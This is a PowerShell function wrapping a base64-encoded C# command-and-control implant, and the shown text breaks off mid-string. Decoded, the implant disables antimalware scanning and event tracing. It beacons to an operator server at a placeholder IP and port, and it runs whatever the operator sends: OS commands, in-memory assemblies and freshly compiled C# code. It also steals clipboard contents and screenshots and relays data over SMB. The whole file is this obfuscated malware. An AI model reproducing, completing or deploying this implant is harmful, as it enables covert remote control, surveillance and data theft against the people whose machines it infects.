function Invoke-Run() {
    $encodedSource = 'dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLk5ldDsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgSFRUUEltcGxhbnQuTW9kdWxlczsNCnVzaW5nIFN5c3RlbS5JTzsNCnVzaW5nIFNNQkltcGxhbnQuTW9kdWxlczsNCg0KbmFtZXNwYWNlIEhUVFBJbXBsYW50DQp7DQogICAgcHVibGljIGNsYXNzIENvbW1hbmQNCiAgICB7DQoNCiAgICAgICAgcHVibGljIHN0cmluZyBJbnB1dCB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgY29tbWFuZCB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgQXJncyB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgSW1wbGFudFVzZXIgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgc3RyaW5nIE9wZXJhdG9yIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBUaW1lVG9FeGVjIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBEZWxheSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgRmlsZSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgdXNlc21iIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBhY3RzbWIgeyBnZXQ7IHNldDsgfQ0KICAgIH0NCg0KICAgIHB1YmxpYyBjbGFzcyBWaWN0aW0NCiAgICB7DQogICAgICAgIHB1YmxpYyBzdHJpbmcgSUQgeyBnZXQ7IHNldDsgfSAgDQogICAgICAgIHB1YmxpYyBzdHJpbmcgRGV2aWNlTmFtZSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgVXNlcm5hbWUgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgaW50IE9wZXJhdG9ySUQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgc3RyaW5nIE5ldHdvcmsgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgc3RyaW5nIE9wZXJhdGluZ1N5c3RlbSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgQ1BVIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgcHVibGljIHN0cmluZyBHUFUgeyBnZXQ7IHNldDsgfQ0KICAgICAgICBwdWJsaWMgaW50IFJBTSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgU3RvcmFnZSB7IGdldDsgc2V0OyB9DQogICAgICAgIHB1YmxpYyBzdHJpbmcgQ3VycmVudERhdGUgeyBnZXQ7IHNldDsgfQ0KICAgIH0NCiAgICAvLyBUaGlzIEltcGxhbnQgY2xhc3MgYWN0cyBhcyB0aGUgZW50cnkgcG9pbnQgb2YgdGhlIGltcGxhbnQgcHJvZ3JhbS4NCiAgICBwdWJsaWMgY2xhc3MgSW1wbGFudA0KICAgIHsNCg0KICAgICAgICBwdWJsaWMgc3RhdGljIFZpY3RpbSB2aWN0aW0gPSBuZXcgVmljdGltKCk7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIGhvc3QgPSAiPElQPiI7ICAvLyBIb3N0IG9mIHRoZSBpbXBsYW50IHNlcnZlcg0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBwb3J0ID0gIjxQT1JUPiI7IC8vIFBvcnQgb2YgdGhlIGltcGxhbnQgc2VydmVyDQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIGxhc3RDb21tYW5kRXhlY3V0ZWQgPSBzdHJpbmcuRW1wdHk7IC8vIFN0b3JlIHRoZSBsYXN0IGNvbW1hbmQgdGhhdCB3YXMgZXhlY3V0ZWQNCiAgICAgICAgcHVibGljIHN0YXRpYyBib29sIFNNQiA9IGZhbHNlOw0KICAgICAgICBwdWJsaWMgc3RhdGljIGJvb2wgYWN0c21iOw0KICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBjb21wdXRlcm5hbWUgPSBzdHJpbmcuRW1wdHk7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIHRva2VuID0gc3RyaW5nLkVtcHR5Ow0KDQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKHN0cmluZ1tdIGFyZ3MpDQogICAgICAgIHsNCg0KICAgICAgICAgICAgc3RyaW5nIGltcGxhbnRJZCA9IEVudmlyb25tZW50Lk1hY2hpbmVOYW1lOw0KDQogICAgICAgICAgICBzdHJpbmcgdmljdGltX2luZm9ybWF0aW9uID0gR2VuZXJhdGVKc29uKCk7DQoNCiAgICAgICAgICAgIHRva2VuID0gUmVnaXN0ZXJJbXBsYW50KHZpY3RpbV9pbmZvcm1hdGlvbik7DQogICAgICAgICAgICB2YXIgdmljdGltID0gbmV3IFZpY3RpbSgpOw0KDQogICAgICAgICAgICB2aWN0aW0gPSBHZXRWaWN0aW0odmljdGltKTsNCg0KICAgICAgICAgICAgQW1zaUhCUC5TdGFydCgpOw0KDQogICAgICAgICAgICBFdHdQYXRjaC5TdGFydCgpOw0KDQogICAgICAgICAgICB1c2luZyAoV2ViQ2xpZW50IHdlYkNsaWVudCA9IG5ldyBXZWJDbGllbnQoKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBzdHJpbmcganNvblJlc3BvbnNlID0gIiI7DQogICAgICAgICAgICAgICAgc3RyaW5nIGxhc3RDb21tYW5kRXhlY3V0ZWQgPSAiIjsNCiAgICAgICAgICAgICAgICB3aGlsZSAodHJ1ZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBDb21tYW5kIGNvbW1hbmQgPSBuZXcgQ29tbWFuZCgpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIVNNQikNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgdXJsID0gImh0dHA6Ly8iICsgaG9zdCArICI6IiArIHBvcnQgKyAiL2dldENvbW1hbmQ/dG9rZW49Iit0b2tlbisiJnVzZXI9IiArIHZpY3RpbS5Vc2VybmFtZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL0NvbnNvbGUuV3JpdGVMaW5lKCJHZXR0aW5nIGluc3RydWN0aW9ucyBmcm9tOiAiICsgdXJsKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGpzb25SZXNwb25zZSA9IHdlYkNsaWVudC5Eb3dubG9hZFN0cmluZyhuZXcgVXJpKHVybCkpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZC5JbnB1dCA9IGpzb25SZXNwb25zZS5TcGxpdChuZXcgc3RyaW5nW10geyAiXCJJbnB1dFwiOlwiIiwgIlwiLFwiQ29tbWFuZCIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuY29tbWFuZCA9IGpzb25SZXNwb25zZS5TcGxpdChuZXcgc3RyaW5nW10geyAiXCJDb21tYW5kXCI6XCIiLCAiXCIsXCJBcmdzIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuTm9uZSlbMV07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZC5BcmdzID0ganNvblJlc3BvbnNlLlNwbGl0KG5ldyBzdHJpbmdbXSB7ICJcIkFyZ3NcIjpcIiIsICJcIixcIkltcGxhbnRVc2VyIiB9LCBTdHJpbmdTcGxpdE9wdGlvbnMuTm9uZSlbMV07DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZC5JbXBsYW50VXNlciA9IGpzb25SZXNwb25zZS5TcGxpdChuZXcgc3RyaW5nW10geyAiXCJJbXBsYW50VXNlclwiOlwiIiwgIlwiLFwiT3BlcmF0b3IiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kLk9wZXJhdG9yID0ganNvblJlc3BvbnNlLlNwbGl0KG5ldyBzdHJpbmdbXSB7ICJcIk9wZXJhdG9yXCI6XCIiLCAiXCIsXCJkZWxheSIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuRGVsYXkgPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwiZGVsYXlcIjpcIiIsICJcIixcInRpbWVUb0V4ZWMiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kLlRpbWVUb0V4ZWMgPSBqc29uUmVzcG9uc2UuU3BsaXQobmV3IHN0cmluZ1tdIHsgIlwidGltZVRvRXhlY1wiOlwiIiwgIlwiLFwiRmlsZSIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuRmlsZSA9IGpzb25SZXNwb25zZS5TcGxpdChuZXcgc3RyaW5nW10geyAiXCJGaWxlXCI6XCIiLCAiXCIsXCJ1c2VzbWIiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kLnVzZXNtYiA9IGpzb25SZXNwb25zZS5TcGxpdChuZXcgc3RyaW5nW10geyAiXCJ1c2VzbWJcIjpcIiIsICJcIixcImFjdHNtYiIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQuYWN0c21iID0ganNvblJlc3BvbnNlLlNwbGl0KG5ldyBzdHJpbmdbXSB7ICJcImFjdHNtYlwiOlwiIiwgIlwifSIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpWzFdOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9TTUJTZXJ2ZXIuU3RvcmVDb21tYW5kKGNvbW1hbmQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAganNvblJlc3BvbnNlID0gU01CQ2xpZW50LlJlYWRDb21tYW5kRnJvbVNNQihjb21wdXRlcm5hbWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJpbmcuSXNOdWxsT3JFbXB0eShqc29uUmVzcG9uc2UpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWU7IC8vIFNraXAgdGhpcyBpdGVyYXRpb24gaWYgbm8gY29tbWFuZCBpcyByZWNlaXZlZA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIC8qQ29uc29sZS5Xcml0ZUxpbmUoIlVzZXIgZm9yIGlzc3VlZCBjb21tYW5kOiAiICsgY29tbWFuZC5JbXBsYW50VXNlcik7DQogICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiQ3VycmVudCBpbXBsYW50IHVzZXI6ICIgKyB2aWN0aW0uVXNlcm5hbWUpOyovDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb21tYW5kLkltcGxhbnRVc2VyID09IHZpY3RpbS5Vc2VybmFtZSkNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBpbnB1dENvbW1hbmQgPSBjb21tYW5kLklucHV0LlRyaW0oKS5Ub0xvd2VyKCk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoIChpbnB1dENvbW1hbmQpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImV4ZWN1dGUtYXNzZW1ibHkiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJSdW5uaW5nIGFzc2VtYmx5Iik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ5dGVzID0gQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKGNvbW1hbmQuRmlsZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIG91dHB1dEFzc2VtYmx5ID0gRXhlY3V0ZUFzc2VtYmx5LkV4ZWN1dGUoYnl0ZXMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXRCYXNlNjRBc3NlbWJseSA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhvdXRwdXRBc3NlbWJseSkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKG91dHB1dEFzc2VtYmx5KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoU01CKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU01CQ2xpZW50LlNlbmREYXRhKG91dHB1dEJhc2U2NEFzc2VtYmx5LCBjb21wdXRlcm5hbWUpOyAvLyBSZXBsYWNlIHdpdGggeW91ciBTTUIgc2VuZGluZyBtZXRob2QNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSFRUUC5TZW5kUmVzdWx0KGhvc3QsIHBvcnQsIGltcGxhbnRJZCwgY29tbWFuZC5PcGVyYXRvciwgb3V0cHV0QmFzZTY0QXNzZW1ibHkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAib3MiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vQ29uc29sZS5Xcml0ZUxpbmUoIlJ1bm5pbmcgY29tbWFuZDogIiArIGNvbW1hbmQuSW5wdXQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXRPUyA9IENvbW1hbmRzLmNvbW1hbmQoY29tbWFuZC5jb21tYW5kLCBjb21tYW5kLkFyZ3MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXRCYXNlNjRPUyA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhvdXRwdXRPUykpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChTTUIpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTTUJDbGllbnQuU2VuZERhdGEob3V0cHV0QmFzZTY0T1MsIGNvbXB1dGVybmFtZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhUVFAuU2VuZFJlc3VsdChob3N0LCBwb3J0LCBpbXBsYW50SWQsIGNvbW1hbmQuT3BlcmF0b3IsIG91dHB1dEJhc2U2NE9TKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInBvd2VybGVzcyI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIG91dHB1dFBMID0gQ29tbWFuZHMuY29tbWFuZChjb21tYW5kLmNvbW1hbmQsIGNvbW1hbmQuQXJncyk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIG91dHB1dEJhc2U2NFBMID0gQ29udmVydC5Ub0Jhc2U2NFN0cmluZyhFbmNvZGluZy5VVEY4LkdldEJ5dGVzKG91dHB1dFBMKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFNNQikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNNQkNsaWVudC5TZW5kRGF0YShvdXRwdXRCYXNlNjRQTCwgY29tcHV0ZXJuYW1lKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSFRUUC5TZW5kUmVzdWx0KGhvc3QsIHBvcnQsIGltcGxhbnRJZCwgY29tbWFuZC5PcGVyYXRvciwgb3V0cHV0QmFzZTY0UEwpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAiZW5hYmxlX3NtYl9jbGllbnQiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNNQiA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tcHV0ZXJuYW1lID0gY29tbWFuZC5BcmdzOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJFbmFibGluZyBTTUIgQ2xpZW50IHdpdGggY29tcHV0ZXI6ICIgKyBjb21wdXRlcm5hbWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXNlICJlbmFibGVfc21iX3NlcnZlciI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlN0YXJ0aW5nIFNNQiBTZXJ2ZXIiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTTUJTZXJ2ZXIuU3RhcnRTZXJ2ZXIoaG9zdCwgcG9ydCwgY29tbWFuZC5JbXBsYW50VXNlciwgY29tbWFuZC5PcGVyYXRvcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImNsaXAiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vQ29uc29sZS5Xcml0ZUxpbmUoIlJ1bm5pbmcgY2xpcGJvYXJkIGZldGNoZXIuLi4gIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIG91dHB1dENsaXAgPSBDbGlwYm9hcmRGZXRjaGVyLkdldERhdGEoKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgb3V0cHV0QmFzZTY0Q2xpcCA9IENvbnZlcnQuVG9CYXNlNjRTdHJpbmcoRW5jb2RpbmcuVVRGOC5HZXRCeXRlcyhvdXRwdXRDbGlwKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFNNQikNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNNQkNsaWVudC5TZW5kRGF0YShvdXRwdXRCYXNlNjRDbGlwLCBjb21wdXRlcm5hbWUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIVFRQLlNlbmRSZXN1bHQoaG9zdCwgcG9ydCwgaW1wbGFudElkLCBjb21tYW5kLk9wZXJhdG9yLCBvdXRwdXRCYXNlNjRDbGlwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInNjcmVlbmdyYWIiOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vQ29uc29sZS5Xcml0ZUxpbmUoIlJ1bm5pbmcgc2NyZWVuIGZldGNoZXIuLi4gIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIG91dHB1dFNjcmVlbiA9IFNjcmVlbkdyYWIuQ2FwdHVyZVNjcmVlbigpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhUVFAuU2VuZFJlc3VsdChob3N0LCBwb3J0LCBpbXBsYW50SWQsIGNvbW1hbmQuT3BlcmF0b3IsIG91dHB1dFNjcmVlbik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImNkIjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvL0NvbnNvbGUuV3JpdGVMaW5lKCJDaGFuZ2luZyB0aGUgY3VycmVudCBkaXJlY3RvcnkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgcGF0aCA9IGNvbW1hbmQuQXJnczsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgb3V0cHV0Q0QgPSBDb21tYW5kcy5TZXRDdXJyZW50RGlyKHBhdGgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBvdXRwdXRCYXNlNjQgPSBDb252ZXJ0LlRvQmFzZTY0U3RyaW5nKEVuY29kaW5nLlVURjguR2V0Qnl0ZXMob3V0cHV0Q0QpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoU01CKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU01CQ2xpZW50LlNlbmREYXRhKG91dHB1dEJhc2U2NCwgY29tcHV0ZXJuYW1lKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgSFRUUC5TZW5kUmVzdWx0KGhvc3QsIHBvcnQsIGltcGxhbnRJZCwgY29tbWFuZC5PcGVyYXRvciwgb3V0cHV0QmFzZTY0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInVwbG9hZCI6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlJlY2VpdmVkOiAiICsgY29tbWFuZC5JbnB1dCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlVwbG9hZGluZzogIiArIGNvbW1hbmQuQXJncyk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gZmlsZSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhjb21tYW5kLkZpbGUpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRmlsZS5Xcml0ZUFsbEJ5dGVzKGNvbW1hbmQuQXJncywgZmlsZSk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiRmlsZSBzYXZlZCB0bzogIiArIGNvbW1hbmQuY29tbWFuZCk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAibG9hZGNzIjoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiQXR0ZW1wdGluZyB0byBDb21waWxlIGFuZCBSdW4gLk5FVCBDIyBDb2RlLi4uIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJpbmcgZW5jb2RlZFNvdXJjZUNvZGUgPSBjb21tYW5kLkZpbGU7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkVuY29kZWQgU291cmNlIENvZGU6IFxuIiArIGVuY29kZWRTb3VyY2VDb2RlKTsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gY29kZSA9IENvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhlbmNvZGVkU291cmNlQ29kZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBkZWNvZGVkU291cmNlQ29kZSA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKGNvZGUpOw0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJEZWNvZGVkIFNvdXJjZSBDb2RlOiBcbiIgKyBkZWNvZGVkU291cmNlQ29kZSk7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcGlsZUFuZFJ1bk5FVC5FeGVjdXRlQ1MoZGVjb2RlZFNvdXJjZUNvZGUpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkV4Y2VwdGlvbiBjYXVnaHQ6ICIgKyBleC5Ub1N0cmluZygpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNh